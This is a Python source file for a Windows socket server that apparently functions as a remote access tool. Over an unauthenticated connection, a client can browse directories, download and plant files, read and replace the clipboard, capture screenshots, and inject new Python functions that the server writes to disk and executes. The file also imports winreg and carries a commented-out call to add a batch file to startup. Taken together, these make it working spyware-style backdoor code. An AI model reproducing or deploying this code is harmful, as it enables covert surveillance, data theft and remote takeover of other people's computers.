import socket
import winreg
import protocol
import pyperclip
import os
from PIL import ImageGrab
import inspect
import io
import other_funcs
import importlib
import importlib.util
import sys
import ast
import re
import logging

ONLY_SERVER_FUNCS = ["handle_client", "main", "update_after_adding_functions", "sends_by_type", "check_errors",
                     "get_function_name", "is_single_function", "get_other_module_modules",
                     "reload_module_and_update_globals", "client_request_handler", "update_after_changing_functions",]


def reload_module_and_update_globals():
    other_funcs_globals = other_funcs.__dict__
    module = importlib.import_module("other_funcs")
    importlib.reload(module)
    other_funcs_globals.update(vars(module))
    return "Success"


def client_added_funcs_handler(function_name_as_str, client_data):

    client_data = client_data.decode()

    results = reload_module_and_update_globals()

    other_funcs_globals = other_funcs.__dict__
    print(other_funcs_globals)

    if results != "Success":
        return results

    function_reference = other_funcs_globals.get(function_name_as_str)
    try:

        if len(client_data) == 0:  # checks if the client sent arguments or not
            requested_data = function_reference()
        else:
            requested_data = function_reference(client_data)  # if got arguments sends it to the function as a list
    except Exception as e:

        if isinstance(e, TypeError):
            return f"{function_name_as_str} {e}."

        remove_added_code(function_name_as_str)
        return f"something wrong with the func {function_name_as_str} removing it because {e}."

    if requested_data is not None:
        return requested_data
    return "data from func is None"


def remove_added_code(bad_function):

    bad_function = bad_function.decode()

    with open("other_funcs.py", "r") as file:
        current_file_code = file.read()

    function_start = current_file_code.find(f"def {bad_function}")
    if function_start == -1:
        return f"Function {bad_function} not found."

    function_end = current_file_code.find("\n\n", function_start)

    if function_end == -1:
        function_end = len(current_file_code)

    new_file_code = current_file_code[:function_start] + current_file_code[function_end:]

    with open("other_funcs.py", "w") as file:
        file.write(new_file_code)

    result = reload_module_and_update_globals()

    if result != "Success":
        return result

    if bad_function in other_funcs.__dict__:
        del other_funcs.__dict__[bad_function]

    return update_after_changing_functions(bad_function)


def get_other_module_modules():  # Returns a list of all modules imported in the other_funcs

    other_funcs_code = open("other_funcs.py", "r").read()

    # Regex to match import statements
    import_pattern = r"^(?:import)\s+(\S+)"  # Capture the module name

    r"""
    (import|from)    # Match 'import' or 'from'
    \s+              # Match one or more spaces
    (\S+)            # Capture the module name (non-whitespace characters)
    """

    # Find all matches in the code
    matches = re.findall(import_pattern, other_funcs_code, re.MULTILINE)
    return matches


def import_module(wanted_module):
    wanted_module = wanted_module.decode()

    if wanted_module in get_other_module_modules():
        return f"Module '{wanted_module}' is already imported."

    module_spec = importlib.util.find_spec(wanted_module)  # checks to see if module exists in python the environment

    if module_spec is None:
        return f"Module '{wanted_module}' is not available in the environment."

    with open("other_funcs.py", "a") as file:
        file.write(f"import {wanted_module}\n")

    return update_after_changing_functions(wanted_module)


def update(client_sent_code):
    client_sent_code = client_sent_code.decode()

    is_function_good, possible_error = is_single_function(client_sent_code)

    if not is_function_good:
        return possible_error

    if "return" not in client_sent_code:
        return "code does not meet the requirements"

    function_name = get_function_name(client_sent_code)

    with open("other_funcs.py", "a") as file:
        file.write("\n" + client_sent_code)

    result = reload_module_and_update_globals()

    if result != "Success":
        return result

    return update_after_changing_functions(function_name)


def is_single_function(code_str):
    try:
        # Parse the code string to an AST
        tree = ast.parse(code_str)

        # Check if the AST contains exactly one function definition
        func_defs = []
        for node in tree.body:
            if isinstance(node, ast.FunctionDef):
                func_defs.append(node)

        # Ensure there's only one function and no other code elements
        if len(func_defs) == 1 and len(tree.body) == 1:
            return True, ""
        else:
            return False, "code does not meet the requirements"
    except SyntaxError as e:
        return False, str(e)


def get_function_name(code):
    code_after_split_by_lines = code.split("\n")
    first_row = code_after_split_by_lines[0]  # takes the first row from the code

    function_name = ""
    for c in first_row[4:]:  # start from 4 because we want to start after def
        if c == '(':  # break when we reach arguments
            break
        function_name += c

    return function_name


def update_after_changing_functions(function_name):
    if 'other_funcs' in sys.modules:
        del sys.modules['other_funcs']
    importlib.import_module('other_funcs')
    return f"Successfully changed added/removed {function_name} and reloaded 'other_funcs'."


def get_basic_functions():
    basic_server_function_list = []
    for client_func in inspect.getmembers(__import__(__name__), predicate=inspect.isfunction):
        basic_server_function_list.append(client_func[0])
    for only_server_function in ONLY_SERVER_FUNCS:
        if only_server_function in basic_server_function_list:
            basic_server_function_list.remove(only_server_function)
    return basic_server_function_list


def get_client_added_functions():
    other_funcs_module = other_funcs.__dict__

    client_added_functions = []

    for name, reference in other_funcs_module.items():
        if inspect.isfunction(reference):
            client_added_functions.append(name)

    for only_server_function in ONLY_SERVER_FUNCS:
        if only_server_function in client_added_functions:
            client_added_functions.remove(only_server_function)

    return client_added_functions


def get_all_functions():
    # Get a list of all client usable functions names in both modules
    server_basic_functions = "functions that reside in the server zone:\n" + "\n".join(get_basic_functions()) + "\n"
    client_added_functions = ("functions that reside in the client added function zone: \n" +
                              "\n".join(get_client_added_functions()))
    return server_basic_functions + "\n" + client_added_functions


def handle_client():

    try:
        function_name_as_str, data = protocol.recv_data(client_socket)
    except ConnectionAbortedError as e:
        logging.error(e)
        logging.info("closing client\n")
        return "close"
    except socket.timeout:
        logging.info("closing socket do to timeout\n")
        return "close"
    except Exception as e:
        logging.exception(e)
        protocol.send_msg(client_socket, "", e)
        return

    end_message = f"server has no func named {function_name_as_str}"

    if function_name_as_str in get_basic_functions():

        function_reference = globals().get(function_name_as_str)  # gets the function as a usable reference

        if len(data) == 0:  # if true it did not get any arguments
            try:
                end_message = function_reference()
            except Exception as e:
                end_message = f"the function {function_name_as_str} didn't work because {e}"

        else:  # if true it got arguments
            try:
                end_message = function_reference(data)
            except Exception as e:
                end_message = f"the function {function_name_as_str} didn't work because {e}"

    elif function_name_as_str in get_client_added_functions():
        try:
            end_message = client_added_funcs_handler(function_name_as_str, data)
        except Exception as e:
            end_message = e

    try:
        protocol.send_msg(client_socket, function_name_as_str, end_message)
    except ConnectionAbortedError as e:
        logging.error(e)
        logging.info("closing client\n")
        return "close"


def help():
    return get_all_functions()


def show_dir(location):
    location = location.decode()
    if os.path.exists(location):
        file_list = []
        for file in os.listdir(location):
            file_list.append(file)
        return "\n".join(file_list)
    return f"no dir named {location} was found."


def get_file(path):
    path = path.decode()
    if os.path.exists(f"{path}"):
        with open(f"{path}", "rb") as file:
            return file.read()
    else:
        return "file doesnt exist."


def add_file(args):
    args = args.decode()
    path = args[:args.find(" ")]
    file_data = args[args.find(" ")+1:]
    if type(file_data) is str:
        file_data = file_data.encode()

    if not os.path.exists(path):
        with open(path, "wb") as c_file:
            c_file.write(file_data)
        return "File added successfully."
    else:
        return "File name occupied."


def see_clipboard():
    return pyperclip.paste()


def add_clipboard(data):
    data = data.decode()
    pyperclip.copy(data)
    return "added"


def get_screenshot():
    screenshot = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    return img_byte_arr


def main():
    # add_batch_to_startup(write_batch_code())
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((protocol.SERVER_HOST, protocol.SERVER_PORT))
    server_socket.listen(1)

    print(f"Server listening on {protocol.SERVER_HOST}:{protocol.SERVER_PORT}")

    logging.basicConfig(filename='log.log', level=logging.INFO, filemode="w",
                        format=f"%(asctime)s - %(levelname)s - %(message)s")

    global client_socket
    client_socket = None
    while True:
        if client_socket is None:
            client_socket, client_address = server_socket.accept()
            logging.info(f"Connection established with {client_address}")

        client_socket.settimeout(120)  # if client does not interact for 2 minutes it disconnects him
        result = handle_client()
        if result is not None:
            if result == "close":
                client_socket = None


if __name__ == "__main__":
    main()
